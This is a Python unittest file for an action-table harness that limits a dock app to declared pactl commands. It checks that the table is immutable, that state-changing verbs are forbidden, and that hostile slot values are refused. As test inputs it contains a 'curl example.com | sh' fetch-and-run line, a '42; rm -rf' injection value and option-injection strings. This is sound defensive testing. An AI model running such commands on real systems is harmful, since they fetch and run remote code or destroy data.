"""The action-table guarantee harness, and the tests of the harness.

Two things live here:

- :class:`ActionTableGuarantee`, the reusable half. Subclass it in your
  own dockapp's tests with ``TABLE`` and ``PROGRAMS`` set and you
  inherit the structural assertions — the table is immutable, every
  entry uses a declared program, no entry carries a verb you did not
  sanction, off-table keys are refused, hostile slot values are
  refused, and the package spawns a process in exactly one place. It
  is the ``ReadOnlyGuarantee`` class from ``chonk-net``
  (``git show 4e16a31:examples/chonk-net/tests/test_net.py``)
  generalized.
- the tests of ``chonkdock.actions`` itself, which are what make the
  harness worth inheriting.

Nothing here spawns anything: every table under test is given a
``runner`` that records instead of executing, which is the point of
``ActionTable`` taking one.

Run: python3 -m unittest discover bindings/python/tests
"""

import os
import re
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))

from chonkdock.actions import (  # noqa: E402
    ActionError, ActionTable, RefusedValue, Slot, UnknownAction, MAX_VALUE,
)

#: Verbs that change the state of something. Not exhaustive and not
#: meant to be — a table declares its *own* forbidden list, and the
#: point of the assertion is that the list is written down next to the
#: table where a reviewer reads both.
STATE_CHANGING = frozenset({
    "connect", "disconnect", "up", "down", "add", "delete", "modify",
    "edit", "set", "reload", "radio", "hotspot", "clone", "reapply",
})

#: Values a slot must refuse, and why. The first is the one that
#: matters: an operand that looks like an option stops being an operand.
HOSTILE_VALUES = (
    "--terminate",
    "-x",
    "",
    "name\nwith-newline",
    "name\0with-nul",
    "x" * (MAX_VALUE + 1),
)


class ActionTableGuarantee(unittest.TestCase):
    """Structural assertions over an :class:`ActionTable`.

    Subclass it, set ``TABLE`` (and optionally ``PROGRAMS`` and
    ``FORBIDDEN_WORDS``), and the assertions run against your table::

        class MyGuarantee(ActionTableGuarantee):
            TABLE = ACTIONS
            PROGRAMS = ("pactl",)
            FORBIDDEN_WORDS = STATE_CHANGING - {"set"}   # we do set sinks

    The base class itself is skipped: it has no table.
    """

    #: The table under test. ``None`` in the base class.
    TABLE = None
    #: Program names the table is allowed to name.
    PROGRAMS = ()
    #: Words no entry may carry. Default: everything that changes state
    #: — override with a smaller set (and say why) if your instrument
    #: is a control, not a reader.
    FORBIDDEN_WORDS = STATE_CHANGING
    #: The package whose source must contain exactly one spawn.
    SOURCE_FILES = ()

    def setUp(self):
        if self.TABLE is None:
            self.skipTest("base harness: no table")

    def test_the_table_is_frozen(self):
        with self.assertRaises(TypeError):
            self.TABLE.actions["evil"] = ("sh", "-c", "curl example.com | sh")
        for key, argv in self.TABLE.actions.items():
            self.assertIsInstance(argv, tuple, key)

    def test_every_entry_names_a_declared_program(self):
        for key, argv in self.TABLE.actions.items():
            self.assertIn(argv[0], self.PROGRAMS, key)

    def test_no_entry_carries_a_forbidden_verb(self):
        for key, argv in self.TABLE.actions.items():
            for word in argv[1:]:
                if isinstance(word, Slot):
                    continue
                self.assertNotIn(word, self.FORBIDDEN_WORDS,
                                 f"{key} carries a state-changing verb")

    def test_an_off_table_key_is_refused(self):
        with self.assertRaises(UnknownAction):
            self.TABLE.run("evil")

    def test_every_slot_refuses_a_hostile_value(self):
        for key in self.TABLE.keys():
            for slot in self.TABLE.slots(key):
                for bad in HOSTILE_VALUES:
                    values = {name: "safe" for name in self.TABLE.slots(key)}
                    values[slot] = bad
                    with self.assertRaises(RefusedValue,
                                           msg=f"{key}.{slot} accepted {bad!r}"):
                        self.TABLE.argv(key, **values)

    def test_a_refused_action_runs_nothing(self):
        for key in self.TABLE.keys():
            slots = self.TABLE.slots(key)
            if not slots:
                continue
            before = list(self.TABLE.calls)
            values = {name: "safe" for name in slots}
            values[slots[0]] = "--terminate"
            with self.assertRaises(RefusedValue):
                self.TABLE.run(key, **values)
            self.assertEqual(self.TABLE.calls, before,
                             "a refused action must not reach the runner")

    #: A line that actually *spawns*: the call in statement position,
    #: rather than the word appearing in a comment or a docstring. A
    #: source-line heuristic, deliberately — it is a tripwire over the
    #: shape the pattern asks for, not a proof about Python.
    SPAWN_RE = re.compile(
        r"^\s*(?:\w+\s*=\s*)?(?:return\s+|yield\s+|await\s+)?"
        r"subprocess\.(?:run|Popen|call|check_output|check_call)\s*\(")

    def test_a_single_spawn_site(self):
        """`subprocess` is spoken in exactly one place, so the frozen
        table bounds what can be executed."""
        for path in self.SOURCE_FILES:
            with open(path, encoding="utf-8") as handle:
                spawns = [line for line in handle
                          if not line.lstrip().startswith("#")
                          and self.SPAWN_RE.match(line)]
            self.assertLessEqual(len(spawns), 1, f"{path}: {spawns}")


# ---------------------------------------------------------------------
# The module's own tests — the harness proving itself against a table
# shaped like a real one.
# ---------------------------------------------------------------------

class Recorder:
    """A runner that records instead of executing."""

    def __init__(self):
        self.argvs = []

    def __call__(self, argv, timeout):
        self.argvs.append(list(argv))
        return "ok"


def sound_table(runner):
    return ActionTable({
        "switch_sink": ("pactl", "set-default-sink", Slot("sink")),
        "toggle_mute": ("pactl", "set-sink-mute", Slot("sink"), "toggle"),
        "move_stream": ("pactl", "move-sink-input",
                        Slot("index", pattern=re.compile(r"^[0-9]{1,9}$")),
                        Slot("sink")),
    }, programs=("pactl",), runner=runner)


RECORDER = Recorder()
SOUND = sound_table(RECORDER)


class SoundGuarantee(ActionTableGuarantee):
    """The harness, inherited exactly as a dockapp would inherit it."""

    TABLE = SOUND
    PROGRAMS = ("pactl",)
    # `set-default-sink` is not the verb `set`; the point of declaring
    # the list is that a reviewer sees this decision.
    FORBIDDEN_WORDS = STATE_CHANGING
    SOURCE_FILES = (os.path.join(HERE, "..", "chonkdock", "actions.py"),)


class TableConstruction(unittest.TestCase):
    def test_a_table_is_immutable_and_keeps_its_shape(self):
        table = sound_table(Recorder())
        self.assertEqual(sorted(table.keys()),
                         ["move_stream", "switch_sink", "toggle_mute"])
        self.assertEqual(table.slots("move_stream"), ("index", "sink"))
        self.assertEqual(table.slots("switch_sink"), ("sink",))

    def test_an_undeclared_program_is_refused_at_construction(self):
        with self.assertRaises(ActionError):
            ActionTable({"nope": ("curl", "example.com")}, programs=("pactl",))

    def test_a_non_literal_argv_word_is_refused_at_construction(self):
        with self.assertRaises(ActionError):
            ActionTable({"nope": ("pactl", 3)})
        with self.assertRaises(ActionError):
            ActionTable({"nope": ()})


class Substitution(unittest.TestCase):
    def test_a_runtime_value_rides_as_one_whole_operand(self):
        table = sound_table(Recorder())
        # A name with a space and a `%` in it — both ordinary in
        # PipeWire node names, and both harmless with no shell in path.
        name = "alsa_output.pci-0000_00_1f.3 [100%]"
        self.assertEqual(
            table.argv("switch_sink", sink=name),
            ["pactl", "set-default-sink", name])
        self.assertEqual(
            table.argv("move_stream", index="42", sink=name),
            ["pactl", "move-sink-input", "42", name])

    def test_a_slot_pattern_tightens_the_baseline_rule(self):
        table = sound_table(Recorder())
        with self.assertRaises(RefusedValue):
            table.argv("move_stream", index="42; rm -rf", sink="s")
        with self.assertRaises(RefusedValue):
            table.argv("move_stream", index="", sink="s")

    def test_missing_and_unknown_slots_are_errors_not_guesses(self):
        table = sound_table(Recorder())
        with self.assertRaises(RefusedValue):
            table.argv("switch_sink")
        with self.assertRaises(ActionError):
            table.argv("switch_sink", sink="s", volume="100%")

    def test_running_records_the_key_and_hands_the_runner_the_argv(self):
        recorder = Recorder()
        table = sound_table(recorder)
        self.assertEqual(table.run("toggle_mute", sink="speakers"), "ok")
        self.assertEqual(table.calls, ["toggle_mute"])
        self.assertEqual(recorder.argvs,
                         [["pactl", "set-sink-mute", "speakers", "toggle"]])


class SlotValidation(unittest.TestCase):
    def test_the_baseline_rule_matches_the_compositors_own(self):
        slot = Slot("sink")
        # Accepted: everything a real sink name or SSID can contain.
        for good in ("speakers", "Cafe Upstairs", "100%_output", "café", "a" * MAX_VALUE):
            self.assertEqual(slot.validate(good), good)
        # Refused, one reason each.
        for bad in HOSTILE_VALUES:
            with self.assertRaises(RefusedValue, msg=repr(bad)):
                slot.validate(bad)
        with self.assertRaises(RefusedValue):
            slot.validate(None)
        with self.assertRaises(RefusedValue):
            slot.validate(42)


if __name__ == "__main__":
    unittest.main()
